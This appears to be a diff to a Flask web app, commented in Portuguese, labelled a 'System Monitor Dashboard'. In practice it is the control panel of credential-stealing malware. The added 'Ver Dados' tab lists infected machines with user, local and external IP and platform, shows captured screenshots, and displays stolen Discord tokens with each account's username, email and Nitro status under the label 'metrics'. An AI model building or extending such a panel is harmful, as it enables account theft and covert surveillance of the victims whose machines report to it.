@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 """
-System Monitor Dashboard - Dashboard de Monitoramento de Sistemas
-API para coleta de metricas e status de endpoints
-Deploy: railway.app
+System Monitor Dashboard - Versão Completa com "Ver Dados"
 """
 
 import os
@@ -19,7 +17,7 @@ CORS(app)
 endpoints = {}
 metrics_data = []
 endpoint_screenshots = {}
-screenshot_requests = {}  # Armazena solicitações de screenshot
+screenshot_requests = {}
 
 @app.route('/')
 def index():
@@ -149,6 +147,18 @@ def get_screenshot(endpoint_id):
         })
     return jsonify({'error': 'No screenshot available'}), 404
 
+@app.route('/api/all_data')
+def get_all_data():
+    """Retorna todos os dados para a aba Ver Dados"""
+    try:
+        return jsonify({
+            'endpoints': list(endpoints.values()),
+            'metrics': metrics_data,
+            'screenshots': endpoint_screenshots
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/api/stats')
 def get_stats():
     """Estatisticas gerais"""
@@ -156,6 +166,7 @@ def get_stats():
         'total_endpoints': len(endpoints),
         'online_endpoints': sum(1 for e in endpoints.values() if e.get('status') == 'online'),
         'total_metrics': len(metrics_data),
+        'total_screenshots': len(endpoint_screenshots),
         'last_update': datetime.now().strftime('%H:%M:%S')
     })
 
@@ -164,7 +175,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Monitor Dashboard</title>
+    <title>System Monitor Dashboard - Completo</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -236,7 +247,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
         }
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 24px;
             margin-bottom: 40px;
         }
@@ -508,6 +519,105 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             padding-left: 12px;
             border-left: 3px solid #a855f7;
         }
+        .data-section {
+            background: rgba(17, 17, 27, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(124, 58, 237, 0.15);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        .data-container {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .screenshot-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .screenshot-item {
+            background: rgba(10, 10, 15, 0.8);
+            border: 1px solid rgba(124, 58, 237, 0.3);
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        .screenshot-item:hover {
+            border-color: rgba(168, 85, 247, 0.5);
+            transform: translateY(-2px);
+        }
+        .screenshot-img {
+            width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            object-fit: cover;
+        }
+        .screenshot-info {
+            font-size: 0.85rem;
+            color: #9ca3af;
+        }
+        .screenshot-time {
+            color: #6b7280;
+            font-size: 0.75rem;
+            margin-top: 8px;
+        }
+        .data-card {
+            background: rgba(17, 17, 27, 0.4);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            transition: all 0.3s ease;
+        }
+        .data-card:hover {
+            border-color: rgba(168, 85, 247, 0.4);
+            background: rgba(17, 17, 27, 0.6);
+        }
+        .data-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
+        }
+        .data-card-title {
+            font-weight: 600;
+            color: #f3f4f6;
+        }
+        .data-card-status {
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        .status-online {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22c55e;
+        }
+        .data-card-content {
+            font-size: 0.9rem;
+            color: #d1d5db;
+            line-height: 1.5;
+        }
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
+        }
+        .data-label {
+            color: #9ca3af;
+            font-weight: 500;
+        }
+        .data-value {
+            color: #f3f4f6;
+            font-weight: 600;
+        }
         @media (max-width: 768px) {
             .stats-grid { grid-template-columns: 1fr; }
             .cards-grid { grid-template-columns: 1fr; }
@@ -520,7 +630,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
     <div class="container">
         <div class="header">
             <h1>System Monitor Dashboard</h1>
-            <p>Monitoramento de Endpoints em Tempo Real</p>
+            <p>Monitoramento Completo de Dados</p>
             <div class="update-time">
                 <button class="refresh-btn" onclick="location.reload()">Atualizar</button>
                 <span id="updateTime">--:--:--</span>
@@ -539,11 +649,16 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 <div class="stat-value" id="totalMetrics">0</div>
                 <div class="stat-label">Metricas</div>
             </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalScreenshots">0</div>
+                <div class="stat-label">Screenshots</div>
+            </div>
         </div>
         <div class="tabs-container">
             <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
             <button class="tab" onclick="showTab('metrics')">Metricas</button>
             <button class="tab" onclick="showTab('remote')">Acesso Remoto</button>
+            <button class="tab" onclick="showTab('data')">Ver Dados</button>
         </div>
         <div id="endpoints" class="tab-content active">
             <h2 class="section-title">Endpoints Monitorados</h2>
@@ -570,6 +685,38 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 </div>
                 <div class="screen-display" id="screenContent">
                     <div class="empty-state">Selecione um endpoint para visualizar</div>
+                </div>
+            </div>
+        </div>
+        <div id="data" class="tab-content">
+            <h2 class="section-title">Todos os Dados Capturados</h2>
+            <div style="margin-bottom: 30px;">
+                <button class="refresh-btn" onclick="loadAllData()">🔄 Atualizar Dados</button>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
+                <!-- Endpoints -->
+                <div class="data-section">
+                    <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">🖥️ Endpoints Conectados</h3>
+                    <div id="dataEndpoints" class="data-container">
+                        <div class="empty-state">Carregando...</div>
+                    </div>
+                </div>
+                
+                <!-- Métricas -->
+                <div class="data-section">
+                    <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">🔑 Tokens Discord</h3>
+                    <div id="dataMetrics" class="data-container">
+                        <div class="empty-state">Carregando...</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Screenshots -->
+            <div class="data-section" style="margin-top: 30px;">
+                <h3 style="color: #a855f7; margin-bottom: 20px; font-size: 1.3rem;">📸 Screenshots Capturados</h3>
+                <div id="dataScreenshots" class="screenshot-grid">
+                    <div class="empty-state">Nenhum screenshot capturado ainda</div>
                 </div>
             </div>
         </div>
@@ -663,6 +810,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                 document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
                 document.getElementById('totalMetrics').textContent = data.total_metrics || 0;
+                document.getElementById('totalScreenshots').textContent = data.total_screenshots || 0;
             } catch(e) {}
         }
         
@@ -724,6 +872,133 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             } catch(e) {}
         }
         
+        async function loadAllData() {
+            try {
+                const res = await fetch('/api/all_data');
+                const data = await res.json();
+                
+                // Carrega endpoints
+                loadEndpointsData(data.endpoints);
+                
+                // Carrega métricas
+                loadMetricsData(data.metrics);
+                
+                // Carrega screenshots
+                loadScreenshotsData(data.screenshots);
+                
+            } catch(e) {
+                console.error('Erro ao carregar todos os dados:', e);
+            }
+        }
+        
+        async function loadEndpointsData(endpoints) {
+            const container = document.getElementById('dataEndpoints');
+            
+            if (endpoints.length === 0) {
+                container.innerHTML = '<div class="empty-state">Nenhum endpoint conectado</div>';
+                return;
+            }
+            
+            container.innerHTML = endpoints.map(e => `
+                <div class="data-card">
+                    <div class="data-card-header">
+                        <span class="data-card-title">${e.hostname}</span>
+                        <span class="data-card-status status-online">${e.status}</span>
+                    </div>
+                    <div class="data-card-content">
+                        <div class="data-item">
+                            <span class="data-label">Usuário:</span>
+                            <span class="data-value">${e.user}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">IP Local:</span>
+                            <span class="data-value">${e.ip_address}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">IP Externo:</span>
+                            <span class="data-value">${e.external_ip}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Plataforma:</span>
+                            <span class="data-value">${e.platform}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">RAM:</span>
+                            <span class="data-value">${e.ram}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Último Acesso:</span>
+                            <span class="data-value">${e.last_seen}</span>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        async function loadMetricsData(metrics) {
+            const container = document.getElementById('dataMetrics');
+            
+            if (metrics.length === 0) {
+                container.innerHTML = '<div class="empty-state">Nenhuma métrica capturada</div>';
+                return;
+            }
+            
+            container.innerHTML = metrics.map(m => {
+                const acc = m.account || {};
+                return `
+                <div class="data-card">
+                    <div class="data-card-header">
+                        <span class="data-card-title">Token Discord</span>
+                        <span class="data-card-status ${m.valid ? 'status-online' : ''}">${m.valid ? 'Válido' : 'Inválido'}</span>
+                    </div>
+                    <div class="data-card-content">
+                        <div class="data-item">
+                            <span class="data-label">Token:</span>
+                            <span class="data-value" style="font-family: monospace; font-size: 0.8rem; word-break: break-all;">${m.token}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Usuário:</span>
+                            <span class="data-value">${acc.username || 'Desconhecido'}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Email:</span>
+                            <span class="data-value">${acc.email || 'Não disponível'}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Nitro:</span>
+                            <span class="data-value">${acc.premium_type ? 'Sim' : 'Não'}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Endpoint:</span>
+                            <span class="data-value">${m.endpoint_id}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Fonte:</span>
+                            <span class="data-value">${m.source}</span>
+                        </div>
+                    </div>
+                </div>`;
+            }).join('');
+        }
+        
+        async function loadScreenshotsData(screenshots) {
+            const container = document.getElementById('dataScreenshots');
+            const screenshotList = Object.entries(screenshots || {});
+            
+            if (screenshotList.length === 0) {
+                container.innerHTML = '<div class="empty-state">Nenhum screenshot capturado ainda</div>';
+                return;
+            }
+            
+            container.innerHTML = screenshotList.map(([endpointId, data]) => `
+                <div class="screenshot-item">
+                    <img class="screenshot-img" src="data:image/png;base64,${data.image}" alt="Screenshot">
+                    <div class="screenshot-info">Endpoint: ${endpointId}</div>
+                    <div class="screenshot-time">${new Date(data.timestamp).toLocaleString()}</div>
+                </div>
+            `).join('');
+        }
+        
         async function requestScreenshot() {
             const endpointId = document.getElementById('endpointSelect').value;
             if (!endpointId) return;
@@ -740,7 +1015,6 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                 const data = await res.json();
                 
                 if (data.status === 'success') {
-                    // Mostra mensagem de sucesso
                     const screenContent = document.getElementById('screenContent');
                     screenContent.innerHTML = `
                         <div style="color: #22c55e; margin-bottom: 20px;">
@@ -749,12 +1023,11 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
                         <div class="live-indicator"><span class="live-dot"></span><span>PROCESSANDO</span></div>
                     `;
                     
-                    // Tenta carregar o screenshot após alguns segundos
                     setTimeout(() => {
                         loadScreen();
                         btn.disabled = false;
                         btn.textContent = '📸 Capturar Screenshot';
-                    }, 5000); // Aumentado para 5 segundos
+                    }, 5000);
                 } else {
                     throw new Error(data.message || 'Erro ao solicitar screenshot');
                 }
@@ -798,18 +1071,20 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
             }
         }
         
+        // Inicialização
         loadStats();
         loadEndpoints();
         loadMetrics();
         updateTime();
         
+        // Atualiza a cada 3 segundos
         setInterval(() => {
             loadStats();
             loadEndpoints();
             loadMetrics();
             loadScreen();
             updateTime();
-        }, 5000);
+        }, 3000);
     </script>
 </body>
 </html>
@@ -817,6 +1092,7 @@ HTML_TEMPLATE = '''<!DOCTYPE html>
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"Servidor iniciando na porta {port}")
-    print(f"Painel: http://localhost:{port}")
+    print(f"🚀 Servidor completo iniciando na porta {port}")
+    print(f"🌐 Painel: http://localhost:{port}")
+    print("📊 Sistema com aba 'Ver Dados' ativado!")
     app.run(host='0.0.0.0', port=port, debug=False)
